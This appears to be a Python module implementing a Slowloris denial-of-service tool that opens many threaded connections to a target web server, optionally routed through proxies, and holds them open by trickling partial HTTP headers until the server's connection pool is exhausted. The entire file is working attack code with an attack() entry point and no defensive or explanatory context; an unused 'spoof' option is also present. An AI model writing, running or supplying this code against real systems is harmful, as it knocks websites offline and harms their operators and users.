import socket
import threading
import time
import random

class Slowloris:
    def __init__(self, target, port, threads, duration, spoof=False, proxies=None):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.stop_event = threading.Event()
        self.connections = []
        self.proxies = proxies or []

    def _open_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            if self.proxies:
                proxy = random.choice(self.proxies)
                ph, pp = proxy.rsplit(":", 1)
                sock.connect((ph, int(pp)))
                header = f"GET http://{self.target}:{self.port}/?{random.randint(1,9999)} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: Mozilla/5.0\r\n"
            else:
                sock.connect((self.target, self.port))
                header = f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: Mozilla/5.0\r\n"
            sock.send(header.encode())
            self.connections.append(sock)
            return sock
        except Exception:
            return None

    def _keep_alive(self, sock):
        while not self.stop_event.is_set() and sock:
            try:
                sock.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                time.sleep(random.uniform(5, 15))
            except Exception:
                try:
                    self.connections.remove(sock)
                except ValueError:
                    pass
                return

    def start(self):
        for _ in range(self.threads):
            sock = self._open_connection()
            if sock:
                t = threading.Thread(target=self._keep_alive, args=(sock,))
                t.daemon = True
                t.start()

        time.sleep(self.duration)
        self.stop_event.set()
        for sock in self.connections:
            try:
                sock.close()
            except Exception:
                pass

def attack(target, port, threads, duration, spoof=False, proxies=None):
    flood = Slowloris(target, port, threads, duration, spoof, proxies)
    flood.start()
